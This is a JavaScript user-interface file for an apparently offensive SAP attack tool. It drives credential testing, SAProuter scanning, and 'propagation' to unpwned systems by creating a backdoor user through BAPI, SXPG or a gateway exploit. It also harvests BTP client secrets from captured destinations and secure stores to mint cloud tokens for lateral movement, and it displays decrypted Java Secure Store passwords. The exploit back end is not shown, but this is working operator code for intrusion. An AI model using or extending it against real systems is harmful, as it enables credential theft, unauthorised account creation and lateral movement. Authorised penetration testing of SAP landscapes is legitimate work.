    <h3>&#128200; ${escHtml(n.sid)} — Business Impact (${withData.length} findings)</h3>
    ${withData.length === 0 ? '<div style="color:#8b949e;padding:8px">No impact data yet. Right-click → Business Impact → Run ABAP/Java Impact Scenarios.</div>' : ''}
    ${withData.map(r => {
      const col = sevColors[r.severity] || '#95a5a6';
      const lbl = sevLabels[r.severity] || 'INFO';
      const icon = r.icon || '';
      const samples = r.sample_records || [];
      const previewRows = samples.slice(0, 5);
      // Two row shapes:
      //   - dicts (ABAP impact scenarios)            -> column per dict key
      //   - plain strings (Java impact scenarios)    -> single "Evidence" col
      const isStringRows = previewRows.length > 0 && typeof previewRows[0] === 'string';
      const cols = isStringRows
          ? ['Evidence']
          : (previewRows.length > 0
              ? Object.keys(previewRows[0]).filter(k => !Array.isArray(previewRows[0][k]) && typeof previewRows[0][k] !== 'object')
              : []);

      return '<div class="detail-section" style="border-left:3px solid ' + col + ';padding-left:10px;margin-bottom:12px">' +
        '<div style="display:flex;justify-content:space-between;align-items:center">' +
          '<h4 style="margin:0;font-size:13px">' + icon + ' ' + escHtml(r.headline) + '</h4>' +
          '<span style="font-size:10px;padding:2px 6px;border-radius:3px;background:' + col + ';color:#fff;font-weight:bold">' + lbl + '</span>' +
        '</div>' +
        '<div style="font-size:11px;color:#8b949e;margin:4px 0">' + escHtml(r.category) + ' &mdash; ' + r.record_count + ' records</div>' +
        '<div style="font-size:12px;color:#c9d1d9;margin:6px 0;white-space:pre-wrap">' + escHtml(r.business_message) + '</div>' +
        (previewRows.length > 0 ? '<details style="margin-top:6px"><summary style="cursor:pointer;font-size:11px;color:#58a6ff">Preview data (' + previewRows.length + ' of ' + samples.length + ' records)</summary>' +
          '<div style="overflow-x:auto;margin-top:4px"><table style="width:100%;font-size:10px;border-collapse:collapse">' +
          '<tr>' + cols.map(c => '<th style="text-align:left;padding:2px 6px;border-bottom:1px solid #30363d;color:#8b949e">' + escHtml(c) + '</th>').join('') + '</tr>' +
          previewRows.map(row => {
            if (isStringRows) {
              return '<tr><td style="padding:2px 6px;border-bottom:1px solid #21262d;font-family:monospace;color:#c9d1d9;word-break:break-all">' + escHtml(String(row)) + '</td></tr>';
            }
            return '<tr>' + cols.map(c => '<td style="padding:2px 6px;border-bottom:1px solid #21262d;font-family:monospace;color:#c9d1d9">' + escHtml(String(row[c]||'')) + '</td></tr>').join('') + '</tr>';
          }).join('') +
          '</table></div>' +
          '<a href="#" class="csv-export-link" data-sid="' + escHtml(n.sid) + '" data-scenario="' + escHtml(r.scenario) + '" ' +
            'style="font-size:11px;color:#58a6ff;text-decoration:none;display:inline-block;margin-top:4px">&#128229; Export CSV</a>' +
          '</details>' : '') +
        '</div>';
    }).join('')}
    ${empty.length > 0 ? '<div class="detail-section" style="margin-top:8px"><h4 style="color:#484f58;font-size:12px">Not found (' + empty.length + ')</h4>' +
      empty.map(r => '<div style="font-size:11px;color:#484f58;margin:2px 0">' + (r.icon||'') + ' ' + escHtml(r.scenario.replace(/_/g,' ')) + '</div>').join('') +
      '</div>' : ''}
  `;

  // Wire up CSV export links
  panel.querySelectorAll('.csv-export-link').forEach(link => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      downloadCsv(link.getAttribute('data-sid'), link.getAttribute('data-scenario'));
    });
  });

  panel.classList.add('visible');
}

function showFindings(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  const panel = document.getElementById('detail-panel');
  const sevMap = { 5:'critical', 4:'high', 3:'medium', 2:'low', 1:'info' };
  panel.innerHTML = `
    <span class="close-btn" onclick="this.parentElement.classList.remove('visible')">&times;</span>
    <h3>${escHtml(n.sid)} — Findings (${(n.findings||[]).length})</h3>
    ${(n.findings || []).slice().sort((a,b) => (b.severity||0) - (a.severity||0)).map(f => {
      const cls = 'finding-' + (sevMap[f.severity] || 'info');
      return `<div class="finding-item ${cls}"><strong>${escHtml(f.severity_label || 'INFO')}</strong> — ${escHtml(f.name)}<br><span style="color:#8b949e;font-size:10px">${escHtml(f.description)}</span></div>`;
    }).join('') || '<div style="color:#484f58">No findings</div>'}
  `;
  panel.classList.add('visible');
}

// --- Credential modal ---
function showCredModal(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;

  // Build info text with existing credentials and created users
  let infoHtml = `<strong>${escHtml(n.sid)}</strong> (${escHtml(n.hostname || n.ip)})`;
  const creds = n.credentials || [];
  const users = n.created_users || [];
  if (creds.length > 0 || users.length > 0) {
    infoHtml += '<div style="margin-top:6px;font-size:11px;color:#8b949e">';
    if (creds.length > 0) {
      infoHtml += '<div style="margin-bottom:2px">Saved credentials:</div>';
      for (const c of creds) {
        const verified = c.verified ? ' &#9989;' : ' &#10060;';
        infoHtml += `<div style="margin-left:8px;color:#c9d1d9">${escHtml(c.username)} / client ${escHtml(c.client)} / inst ${escHtml(c.instance_nr)}${verified}</div>`;
      }
    }
    if (users.length > 0) {
      infoHtml += '<div style="margin-top:4px;margin-bottom:2px">Created users:</div>';
      for (const u of users) {
        infoHtml += `<div style="margin-left:8px;color:#3fb950">${escHtml(u.username)} / client ${escHtml(u.client)} &#9889;</div>`;
      }
    }
    infoHtml += '</div>';
  }
  document.getElementById('cred-system-info').innerHTML = infoHtml;

  // Find real instance numbers (exclude XX)
  const instNrs = (n.instances || [])
    .map(i => i.instance_nr)
    .filter(nr => nr && nr !== 'XX')
    .sort();
  const inp = document.getElementById('cred-instance');
  inp.value = instNrs[0] || '00';
  document.getElementById('cred-instance-hint').textContent =
    instNrs.length > 1 ? 'Available: ' + instNrs.join(', ') : '';
  document.getElementById('cred-client').value = (n.clients && n.clients[0]) ?
    (n.clients[0].nr || '100') : '100';
  document.getElementById('cred-user').value = '';
  document.getElementById('cred-pass').value = '';
  document.getElementById('cred-modal').classList.add('visible');
}

async function testCredentials() {
  const creds = {
    instance_nr: document.getElementById('cred-instance').value,
    client: document.getElementById('cred-client').value,
    username: document.getElementById('cred-user').value,
    password: document.getElementById('cred-pass').value,
  };
  const res = await api('POST', `node/${selectedNodeSid}/credentials`, { ...creds, test_only: true });
  alert(res.success ? 'Connection successful!' : 'Connection failed: ' + (res.message || 'Unknown error'));
}

async function saveCredentials() {
  const creds = {
    instance_nr: document.getElementById('cred-instance').value,
    client: document.getElementById('cred-client').value,
    username: document.getElementById('cred-user').value,
    password: document.getElementById('cred-pass').value,
  };
  await api('POST', `node/${selectedNodeSid}/credentials`, creds);
  closeModal('cred-modal');
  startPolling();
  await pollUpdates();  // refresh state immediately
}

async function downloadTable() {
  const fields = document.getElementById('tbl-fields').value;
  await api('POST', `node/${selectedNodeSid}/download_table`, {
    table: document.getElementById('tbl-name').value,
    fields: fields ? fields.split(',').map(f => f.trim()) : [],
    where: document.getElementById('tbl-where').value,
    max_rows: parseInt(document.getElementById('tbl-maxrows').value) || 500,
  });
  closeModal('table-modal');
}

function showTypeModal(sid) {
  const n = (mapState.nodes || {})[sid];
  document.getElementById('type-system-info').textContent = sid + (n ? ' (' + (n.system_type || 'unknown') + ')' : '');
  const sel = document.getElementById('type-select');
  sel.selectedIndex = 0; // reset to placeholder
  if (n && n.system_type) {
    for (let i = 0; i < sel.options.length; i++) {
      if (sel.options[i].value.toUpperCase() === n.system_type.toUpperCase()) {
        sel.selectedIndex = i; break;
      }
    }
  }
  document.getElementById('type-modal').classList.add('visible');
}
async function saveSystemType() {
  const newType = document.getElementById('type-select').value;
  await api('POST', `node/${selectedNodeSid}/set_type`, { system_type: newType });
  closeModal('type-modal');
  startPolling();
}
function showDbTypeModal(sid) {
  const n = (mapState.nodes || {})[sid];
  document.getElementById('db-type-system-info').textContent = sid + (n ? ' (DB: ' + (n.db_type || 'unknown') + ')' : '');
  const sel = document.getElementById('db-type-select');
  sel.selectedIndex = 0;
  if (n && n.db_type) {
    for (let i = 0; i < sel.options.length; i++) {
      if (sel.options[i].value.toUpperCase() === n.db_type.toUpperCase()) {
        sel.selectedIndex = i; break;
      }
    }
  }
  document.getElementById('db-type-modal').classList.add('visible');
}
async function saveDbType() {
  const newDb = document.getElementById('db-type-select').value;
  await api('POST', `node/${selectedNodeSid}/set_db_type`, { db_type: newDb });
  closeModal('db-type-modal');
  startPolling();
}
function showOsTypeModal(sid) {
  const n = (mapState.nodes || {})[sid];
  document.getElementById('os-type-system-info').textContent = sid + (n ? ' (OS: ' + (n.os_type || 'unknown') + ')' : '');
  const sel = document.getElementById('os-type-select');
  sel.selectedIndex = 0;
  if (n && n.os_type) {
    for (let i = 0; i < sel.options.length; i++) {
      if (sel.options[i].value.toLowerCase() === n.os_type.toLowerCase()) {
        sel.selectedIndex = i; break;
      }
    }
  }
  document.getElementById('os-type-modal').classList.add('visible');
}
async function saveOsType() {
  const newOs = document.getElementById('os-type-select').value;
  await api('POST', `node/${selectedNodeSid}/set_os_type`, { os_type: newOs });
  closeModal('os-type-modal');
  startPolling();
}
function showInstanceNrModal(sid) {
  const n = (mapState.nodes || {})[sid];
  const cur = (n && n.instances && n.instances.length) ? n.instances[0].instance_nr : '';
  document.getElementById('instance-nr-system-info').textContent =
    sid + (cur ? ' (current: ' + cur + ')' : ' (no instance set)');
  document.getElementById('instance-nr-input').value = cur || '';
  document.getElementById('instance-nr-modal').classList.add('visible');
  document.getElementById('instance-nr-input').focus();
  document.getElementById('instance-nr-input').select();
}
async function saveInstanceNr() {
  const raw = (document.getElementById('instance-nr-input').value || '').trim();
  if (!/^\d{2}$/.test(raw)) {
    alert('Instance number must be exactly two digits, e.g. 00 or 01.');
    return;
  }
  const r = await api('POST', `node/${selectedNodeSid}/set_instance_nr`,
                      { instance_nr: raw });
  if (r && r.error) { alert('Set failed: ' + r.error); return; }
  closeModal('instance-nr-modal');
  startPolling();
}

function showSaprouterModal(sid) {
  const n = (mapState.nodes || {})[sid];
  document.getElementById('saprouter-system-info').textContent =
    sid + (n && n.saprouter ? ' (current: ' + n.saprouter + ')' : ' (no SAProuter set)');
  document.getElementById('saprouter-input').value = (n && n.saprouter) || '';
  document.getElementById('saprouter-modal').classList.add('visible');
  document.getElementById('saprouter-input').focus();
}

function showRouterScanModal(sid) {
  const n = (mapState.nodes || {})[sid];
  const ri = (n && n.saprouter_info) || {};
  const routerIp = (n && n.ip) || sid;

  // Info line
  let infoText = sid + ' (' + routerIp + ')';
  if (n && n.saprouter) infoText += '  •  routing via: ' + n.saprouter;
  document.getElementById('router-scan-info').textContent = infoText;

  // Auto-targets from router info
  const autoRow = document.getElementById('router-scan-autotargets-row');
  const autoCount = document.getElementById('router-scan-auto-count');
  if (ri.vulnerable && ((ri.clients && ri.clients.length) || (ri.raw_info && ri.raw_info.length))) {
    autoRow.style.display = '';
    const cnt = (ri.clients || []).length;
    autoCount.textContent = cnt ? '(' + cnt + ' client IP(s) available)' : '';
  } else {
    autoRow.style.display = 'none';
  }

  // Clear manual target field
  document.getElementById('router-scan-targets').value = '';

  document.getElementById('router-scan-modal').classList.add('visible');
  document.getElementById('router-scan-targets').focus();
}

async function startRouterScan() {
  const sid = selectedNodeSid;
  const targets  = document.getElementById('router-scan-targets').value.trim();
  const auto     = document.getElementById('router-scan-auto').checked;
  const instFrom = parseInt(document.getElementById('router-scan-inst-from').value) || 0;
  const instTo   = parseInt(document.getElementById('router-scan-inst-to').value) || 10;
  const mode     = document.getElementById('router-scan-mode').value;
  const conc     = parseInt(document.getElementById('router-scan-concurrency').value) || 10;
  const tout     = parseFloat(document.getElementById('router-scan-timeout').value) || 5;

  if (!targets && !auto) {
    alert('Please enter a target range or enable auto-fill from router info.');
    return;
  }

  closeModal('router-scan-modal');
  const r = await api('POST', `node/${sid}/router_scan`, {
    targets:      targets,
    auto_targets: auto,
    inst_from:    instFrom,
    inst_to:      instTo,
    mode:         mode,
    concurrency:  conc,
    timeout:      tout,
  });
  if (r && r.error) {
    alert('Router scan failed to start: ' + r.error);
  } else if (r && r.status === 'started') {
    console.log('Router scan started:', r);
  }
  startPolling();
}
async function saveSaprouter() {
  const val = document.getElementById('saprouter-input').value.trim();
  await api('POST', `node/${selectedNodeSid}/set_saprouter`, { saprouter: val });
  closeModal('saprouter-modal');
  startPolling();
}

function closeModal(id) { document.getElementById(id).classList.remove('visible'); }

async function showSetPasswordModal() {
  const res = await api('GET', 'settings/password');
  document.getElementById('pwd-current').value = res.password || '?';
  document.getElementById('pwd-new').value = '';
  document.getElementById('password-modal').classList.add('visible');
  document.getElementById('pwd-new').focus();
}
async function setDefaultPassword() {
  const newPwd = document.getElementById('pwd-new').value;
  if (!newPwd) { alert('Password cannot be empty'); return; }
  const res = await api('POST', 'settings/password', { password: newPwd });
  if (res.error) { alert(res.error); return; }
  closeModal('password-modal');
}

function showAddSystemModal() {
  document.getElementById('add-sid').value = '';
  document.getElementById('add-ip').value = '';
  document.getElementById('add-instance').value = '00';
  document.getElementById('add-saprouter').value = '';
  document.getElementById('add-system-modal').classList.add('visible');
  document.getElementById('add-sid').focus();
}
async function addSystem() {
  const sid = document.getElementById('add-sid').value.trim().toUpperCase();
  const ip = document.getElementById('add-ip').value.trim();
  const inst = document.getElementById('add-instance').value.trim();
  const saprouter = document.getElementById('add-saprouter').value.trim();
  if (!sid || !ip || !inst) { alert('SID, IP, and Instance are required'); return; }
  const res = await api('POST', 'node/add', { sid, ip, instance_nr: inst, saprouter });
  if (res.error) { alert(res.error); return; }
  closeModal('add-system-modal');
  startPolling();
}

function showTcpipModal(sid) {
  document.getElementById('tcpip-source-info').textContent = `Source: ${sid}`;
  const sel = document.getElementById('tcpip-target');
  sel.innerHTML = '';
  const nodes = mapState.nodes || {};
  for (const s in nodes) {
    if (s === sid) continue;
    const n = nodes[s];
    const label = `${s} (${n.ip || n.hostname || '?'})`;
    sel.innerHTML += `<option value="${s}">${label}</option>`;
  }
  if (sel.options.length === 0) {
    alert('No other systems on the map to create a destination to.');
    return;
  }
  document.getElementById('tcpip-modal').classList.add('visible');
}
async function createTcpipDest() {
  const targetSid = document.getElementById('tcpip-target').value;
  if (!targetSid) { alert('Select a target system'); return; }
  closeModal('tcpip-modal');
  await api('POST', `node/${selectedNodeSid}/create_tcpip_dest`, { target_sid: targetSid });
  startPolling();
}

function showPropagateModal(sid) {
  document.getElementById('propagate-source-info').textContent = `Source: ${sid}`;
  const sel = document.getElementById('propagate-target');
  sel.innerHTML = '';
  const nodes = mapState.nodes || {};
  const conns = mapState.connections || [];

  // Build list of reachable targets from this source
  const targets = {};
  for (const c of conns) {
    if (c.source_sid !== sid) continue;
    if (!c.target_sid || c.target_sid === sid) continue;
    const tgt = nodes[c.target_sid];
    if (!tgt) continue;
    if (tgt.pwned) continue;  // already pwned
    const key = c.target_sid;
    if (!targets[key]) targets[key] = { sid: key, methods: [] };
    if (c.sapxpg_remote_works) {
      targets[key].methods.push(`TCP/IP: ${c.destination_name}`);
    } else if (c.logon_successful && c.has_sap_all) {
      targets[key].methods.push(`RFC+SAP_ALL: ${c.destination_name}`);
    } else if (c.logon_successful) {
      targets[key].methods.push(`RFC Logon OK: ${c.destination_name}`);
    }
  }
  // Also add GW-vulnerable targets that are on the map
  for (const s in nodes) {
    if (s === sid) continue;
    const n = nodes[s];
    if (n.pwned) continue;
    if (n.gw_vulnerable && !targets[s]) {
      targets[s] = { sid: s, methods: ['GW Vulnerable'] };
    } else if (n.gw_vulnerable && targets[s]) {
      targets[s].methods.push('GW Vulnerable');
    }
  }

  if (Object.keys(targets).length === 0) {
    alert('No exploitable targets found.\\n\\nNeed: RFC Type 3 with SAP_ALL, TCP/IP with ping OK, or vulnerable gateway on a target system.');
    return;
  }

  for (const key in targets) {
    const t = targets[key];
    const n = nodes[t.sid];
    const host = n ? (n.ip || n.hostname || '?') : '?';
    const methods = t.methods.length ? ` [${t.methods.join(', ')}]` : '';
    sel.innerHTML += `<option value="${t.sid}">${t.sid} (${host})${methods}</option>`;
  }
  document.getElementById('propagate-hint').textContent =
    'Select a target system to create a SAPMAP user on. ' +
    'Tries BAPI first, then SXPG over TCP/IP, then GW exploit.';
  document.getElementById('propagate-modal').classList.add('visible');
}
async function doPropagateTarget() {
  const targetSid = document.getElementById('propagate-target').value;
  if (!targetSid) { alert('Select a target system'); return; }
  closeModal('propagate-modal');
  await api('POST', `node/${selectedNodeSid}/propagate`, { target_sid: targetSid });
  startPolling();
}

// On-prem → BTP lateral move: show captured BTP-bound credentials
// (SM59 destinations to *.hana.ondemand.com, RSECTAB / Java SecStore
// rows) and let the operator pick one to exchange at XSUAA for a
// BTP access token.  After a successful mint the existing BTP
// pull-destinations flow runs automatically.
async function showHarvestBtpCredsModal(sid) {
  const r = await api('POST', `node/${sid}/harvest_btp_creds`);
  const cands = (r && r.candidates) || [];
  const overlay = document.createElement('div');
  overlay.className = 'modal-overlay';
  overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center';
  overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };

  const rows = cands.map((c, i) => `
    <tr style="border-top:1px solid #30363d">
      <td style="padding:6px 8px;font-size:11px;color:#8b949e">${escHtml(c.source)}</td>
      <td style="padding:6px 8px;font-size:11px;font-family:monospace;word-break:break-all">${escHtml(c.label)}</td>
      <td style="padding:6px 8px"><input id="btph-uaa-${i}" value="${escHtml(c.uaa_url)}" style="width:100%;font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:3px 6px;border-radius:3px"></td>
      <td style="padding:6px 8px"><input id="btph-cid-${i}" value="${escHtml(c.client_id)}" style="width:160px;font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:3px 6px;border-radius:3px"></td>
      <td style="padding:6px 8px"><input id="btph-cs-${i}" value="${escHtml(c.client_secret)}" type="password" style="width:160px;font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:3px 6px;border-radius:3px"></td>
      <td style="padding:6px 8px"><button class="btn" onclick="doMintBtpToken('${escHtml(sid)}', ${i})" style="background:#1f6feb;color:#fff;border:0;padding:4px 10px;border-radius:4px;cursor:pointer">Mint</button></td>
    </tr>`).join('');

  overlay.innerHTML = `
    <div class="modal" style="max-width:1100px;width:96%;max-height:90vh;overflow-y:auto;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px 20px;color:#c9d1d9">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
        <h3 style="margin:0;color:#f0883e">&#9729; Harvest BTP Credentials — ${escHtml(sid)}</h3>
        <button onclick="this.closest('.modal-overlay').remove()" style="background:transparent;border:0;color:#c9d1d9;font-size:22px;cursor:pointer">&times;</button>
      </div>
      <div style="font-size:12px;color:#8b949e;margin-bottom:10px;line-height:1.45">
        Refreshes <code>OA2C_CLIENT</code> + <code>OA2C_CLIENT_EXT</code> (transaction <b>OA2C_CONFIG</b>) and scans this node's already-captured artefacts
        (SM59 destinations to <code>*.hana.ondemand.com</code>, ABAP RSECTAB, Java SecStoreFS) for BTP-shaped <code>(client_id, client_secret)</code> pairs.
        Click <b>Mint</b> on a row to exchange at the destination's XSUAA <code>/oauth/token</code> endpoint with <code>grant_type=client_credentials</code>
        and store the resulting BTP token; the cloud topology is then enumerated automatically.
      </div>
      ${cands.length === 0 ? `
        <div style="padding:14px;background:#0d1117;border:1px dashed #30363d;border-radius:6px;text-align:center;color:#8b949e;font-size:12px">
          No BTP-bound credentials found in <b>${escHtml(sid)}</b>'s captures yet.<br>
          Try running <b>Retrieve RFC Connections</b> + <b>Download SecStore</b> first; outbound destinations to
          <code>*.authentication.*.hana.ondemand.com</code> with cleartext-recovered passwords will appear here.<br><br>
          Or paste credentials manually:
        </div>
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr auto;gap:6px;margin-top:10px;align-items:center">
          <input id="btph-uaa-manual" placeholder="https://&lt;subdomain&gt;.authentication.&lt;region&gt;.hana.ondemand.com/oauth/token" style="font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:6px 8px;border-radius:3px">
          <input id="btph-cid-manual" placeholder="client_id (e.g. sb-clone…!b…|destination-xsappname!b…)" style="font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:6px 8px;border-radius:3px">
          <input id="btph-cs-manual" placeholder="client_secret" type="password" style="font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:6px 8px;border-radius:3px">
          <button class="btn" onclick="doMintBtpToken('${escHtml(sid)}', 'manual')" style="background:#1f6feb;color:#fff;border:0;padding:6px 14px;border-radius:4px;cursor:pointer">Mint</button>
        </div>
      ` : `
        <table style="width:100%;border-collapse:collapse;font-size:11px">
          <thead>
            <tr style="background:#0d1117">
              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">Source</th>
              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">Origin</th>
              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">UAA URL (token endpoint)</th>
              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">client_id</th>
              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">client_secret</th>
              <th></th>
            </tr>
          </thead>
          <tbody>${rows}</tbody>
        </table>
      `}
      <div id="btph-result" style="margin-top:12px;font-size:12px;font-family:monospace;color:#8b949e"></div>
    </div>
  `;
  document.body.appendChild(overlay);
}

async function doMintBtpToken(sid, idx) {
  const suffix = idx === 'manual' ? 'manual' : String(idx);
  const uaa = document.getElementById(`btph-uaa-${suffix}`).value.trim();
  const cid = document.getElementById(`btph-cid-${suffix}`).value.trim();
  const cs = document.getElementById(`btph-cs-${suffix}`).value.trim();
  const result = document.getElementById('btph-result');
  result.style.color = '#c9d1d9';
  result.textContent = `Minting against ${uaa} …`;
  if (!uaa || !cid || !cs) {
    result.style.color = '#f85149';
    result.textContent = 'uaa_url, client_id and client_secret are required';
    return;
  }
  const r = await api('POST', `node/${sid}/mint_btp_token`, {
    uaa_url: uaa, client_id: cid, client_secret: cs });
  if (!r || !r.ok) {
    result.style.color = '#f85149';
    result.textContent = `Mint failed: ${(r && r.error) || 'unknown error'}`;
    return;
  }
  result.style.color = '#3fb950';
  // The mint endpoint auto-enumerates server-side and returns the
  // result inline (`r.enumerate`), so no second HTTP call needed.
  const e = r.enumerate || {};
  let line = `Token minted for region ${r.region}.`;
  if (e.error) {
    line += `  (auto-enumerate: ${e.error})`;
  } else if (typeof e.destinations === 'number') {
    line += ` ✓ ${e.destinations} destination(s) captured, `
          + `${e.cleartext_captured} cleartext, `
          + `${e.linked_to_onprem} linked.`;
  }
  result.textContent = line;
  startPolling();
}

// --- OS Terminal ---

// --- Non-blocking toast (bottom-right) ---
// Used by the Java Secure Store extraction path so results appear
// without hiding auto-plotted downstream nodes behind a full modal.
function showToast(html, {stickUntilClose=false, autoCloseMs=15000} = {}) {
  const stack = document.getElementById('toast-stack');
  if (!stack) return;
  const toast = document.createElement('div');
  toast.style.cssText = [
    'background:#1c2128',
    'border:1px solid #30363d',
    'border-left:4px solid #3fb950',
    'border-radius:6px',
    'padding:10px 12px',
    'box-shadow:0 6px 20px rgba(0,0,0,.5)',
    'min-width:320px',
    'max-width:440px',
    'font-size:12px',
    'color:#e6edf3',
    'pointer-events:auto',
    'opacity:0',
    'transform:translateY(8px)',
    'transition:opacity .18s ease, transform .18s ease',
  ].join(';');
  toast.innerHTML = html;
  stack.appendChild(toast);
  // Animate in
  requestAnimationFrame(() => {
    toast.style.opacity = '1';
    toast.style.transform = 'translateY(0)';
  });
  const close = () => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateY(8px)';
    setTimeout(() => toast.remove(), 200);
  };
  toast.querySelectorAll('[data-close]').forEach(el => {
    el.addEventListener('click', close);
  });
  if (!stickUntilClose && autoCloseMs > 0) {
    setTimeout(close, autoCloseMs);
  }
  return close;
}

function showJavaSecStoreToast(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  const entries = n.java_secstore_entries || [];
  const offlineCount = entries.filter(e =>
      (e.source || '').indexOf('offline') !== -1).length;
  const configCount = entries.filter(e =>
      (e.source || '').startsWith('J2EE_CONFIGENTRY')).length;
  const fileCount = entries.filter(e =>
      e.source === 'SecStore.properties').length;
  const failed = (n.java_secstore_failed_decrypts || []).length;
  showToast(
    '<div style="display:flex;justify-content:space-between;'
      + 'align-items:center;margin-bottom:6px">'
      + '<strong style="color:#3fb950">&#128273; '
        + escHtml(sid) + ' secure store extracted</strong>'
      + '<span data-close style="cursor:pointer;color:#8b949e;'
        + 'font-size:14px;margin-left:12px" title="dismiss">&times;</span>'
    + '</div>'
    + '<div style="color:#c9d1d9;line-height:1.5">'
      + fileCount + ' file entries · '
      + configCount + ' config rows'
      + (offlineCount ? ' <span style="color:#58a6ff">('
          + offlineCount + ' via offline decrypt)</span>' : '')
      + (failed ? ' · <span style="color:#d29922">'
          + failed + ' still undecryptable</span>' : '')
    + '</div>'
    + '<div style="margin-top:8px;display:flex;gap:6px">'
      + '<button class="btn btn-primary" style="padding:3px 10px;'
        + 'font-size:11px" onclick="showJavaSecStoreModal(\''
        + escHtml(sid) + '\');this.closest(\'div\').parentElement.'
        + 'querySelector(\'[data-close]\').click()">View details</button>'
      + '<button class="btn" style="padding:3px 10px;font-size:11px"'
        + ' data-close>Dismiss</button>'
    + '</div>',
    {autoCloseMs: 12000}
  );
}

// --- Java Secure Store results modal ---
let _jssCurrentSid = '';

function showJavaSecStoreModal(sid) {
  _jssCurrentSid = sid;
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  document.getElementById('jss-sid').textContent = sid;
  const entries = n.java_secstore_entries || [];
  const fe = entries.filter(e => (e.source || '') === 'SecStore.properties').length;
  const ce = entries.filter(e => (e.source || '') === 'J2EE_CONFIGENTRY').length;
  const ds = entries.filter(e => e.is_downstream).map(e => e.target_sid);
  const dsText = ds.length
      ? ' | <span style="color:#f85149">downstream: ' + Array.from(new Set(ds)).join(', ') + '</span>'
      : '';
  document.getElementById('jss-meta').innerHTML =
      'version=' + escHtml(n.java_secstore_version || '?') +
      ' | algorithm=' + escHtml((n.java_secstore_algorithm || '?').slice(0, 80)) +
      ' | file=' + fe + ' · configentry=' + ce + dsText;
  renderJssTable();
  document.getElementById('jss-modal').classList.add('visible');
}

function renderJssTable() {
  const sid = _jssCurrentSid;
  if (!sid) return;
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  const entries = n.java_secstore_entries || [];
  const showPw = document.getElementById('jss-showpw').checked;
  const showNoise = document.getElementById('jss-shownoise').checked;
  const filter = (document.getElementById('jss-filter').value || '').toLowerCase();
  const tbody = document.getElementById('jss-tbody');
  const rows = [];
  const isPwField = (name) => /pass|pwd|secret|credential/i.test(name);
  let hiddenNoise = 0;
  for (const e of entries) {
    const name = e.name || '';
    const value = e.value || '';
    // Noise filter: framework-internal rows that never contain
    // user-facing secrets.  Hidden by default; user can toggle the
    // 'Show noise' checkbox to reveal.  Matches:
    //   * #~childInstance.N  — cluster framework state
    //   * #~data-source-aliases.xml  — JNDI alias descriptor
    //   * #~Secured Property*  — generic property bag entries
    //   * kind === 'undecryptable'  — rows whose VBYTES couldn't be
    //     recovered by either engine or offline path
    if (!showNoise && (
          /childinstance/i.test(name)
          || /^#~data-source-aliases\.xml$/i.test(name)
          || /^#~secured property/i.test(name)
          || (e.kind || '').toLowerCase() === 'undecryptable'
        )) {
      hiddenNoise++;
      continue;
    }
    // Build a flat "belongs to" string from dest_name / dest_user /
    // target_sid / client so the filter can match destination names
    // (e.g. 'UMEBackendConnection') that only live in those fields.
    const belongsStr = [e.dest_name || '', e.dest_user || '',
                         e.dest_host || '',
                         e.target_sid || '', e.client || '',
                         e.cid || '']
                         .filter(Boolean).join(' ').toLowerCase();
    if (filter && name.toLowerCase().indexOf(filter) === -1
               && value.toLowerCase().indexOf(filter) === -1
               && belongsStr.indexOf(filter) === -1) continue;
    let display = value;
    if (!showPw && isPwField(name)) {
      display = (value.length > 0) ? '•'.repeat(Math.min(value.length, 8)) + ' (' + value.length + 'B)' : '(empty)';
    }
    // Heuristic redact for JDBC / connection-string values that embed
    // passwords inline even when the entry name doesn't advertise it.
    if (!showPw) {
      display = display.replace(/(password\s*=)[^&;\s]+/gi, '$1***');
    }
    // Modal: cap large values at 2000 chars to keep the table scrollable.
    // The full value is always retained on node.java_secstore_entries
    // (unsliced) and reachable via the per-row "Copy" button.
    if (display.length > 2000) display = display.slice(0, 2000) + '… [+'+(value.length-2000)+' more — use Copy button]';
    const kind = e.kind || '';
    const target = e.target_sid || '';
    const source = e.source || '';
    const ds = e.is_downstream ? ' style="color:#f85149"' : '';
    // "Belongs to" column: for J2EE_CONFIGENTRY rows tied to a JCo
    // destination CID, surface dest_name + user@target_sid/client so the
    // user can tell two identically-named #~jco.client.passwd rows apart.
    let belongs = '';
    if (e.dest_name) {
      belongs = '<span style="color:#f85149">' + escHtml(e.dest_name) + '</span>';
      if (e.dest_user || target || e.dest_host) {
        belongs += ' <span style="color:#8b949e">(';
        if (e.dest_user) belongs += escHtml(e.dest_user);
        // Prefer the resolved target SID; fall back to the raw host when
        // the destination has no r3name (typical for UMEBackendConnection
        // and other SAP system destinations).
        if (target) {
          belongs += (e.dest_user ? '@' : '') + escHtml(target);
        } else if (e.dest_host) {
          belongs += (e.dest_user ? '@' : '') + escHtml(e.dest_host);
        }
        if (e.client) belongs += '/' + escHtml(e.client);
        belongs += ')</span>';
      }
    } else if (e.dest_user || e.dest_host || target) {
      // Orphan destination (no #~destination.name row found) — build a
      // user@host or user@SID/client label so the row is identifiable
      // instead of showing blank.  Typical case: UMEBackendConnection
      // and other SAP system destinations.
